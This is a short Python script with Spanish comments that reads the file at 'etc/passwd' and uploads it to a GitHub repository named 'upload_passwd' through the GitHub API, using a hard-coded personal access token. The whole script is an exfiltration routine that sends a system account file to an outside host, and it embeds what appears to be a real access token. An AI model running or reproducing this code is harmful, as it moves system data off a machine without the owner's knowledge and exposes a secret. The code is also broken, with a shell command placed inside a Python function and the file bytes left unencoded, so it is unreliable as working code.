def run():
  sudo pip install requests
  import requests

  # Configura tu token de acceso personal y la URL del archivo remoto en GitHub
  token = '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'
  repo_owner = 'Oxitocinaa'
  repo_name = 'upload_passwd'
  file_path = 'etc/passwd'
  branch = 'main'  # O la rama que desees
  
  # URL de la API de GitHub para crear un archivo
  url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'
  
  # Carga el contenido del archivo local
  with open(file_path, 'rb') as file:
      file_content = file.read()
  
  # Prepara los datos para la solicitud HTTP
  data = {
      'message': 'Subir archivo desde script de Python',
      'content': file_content,
      'branch': branch
  }
  
  # Configura las cabeceras con el token de acceso personal
  headers = {
      'Authorization': f'token {token}'
  }
  
  # Realiza la solicitud POST para subir el archivo
  response = requests.put(url, json=data, headers=headers)
  
  if response.status_code == 201:
      print(f'Archivo "{file_path}" subido exitosamente a la rama "{branch}" en el repositorio "{repo_name}".')
  else:
      print(f'Error al subir el archivo: {response.status_code} - {response.json()["message"]}')

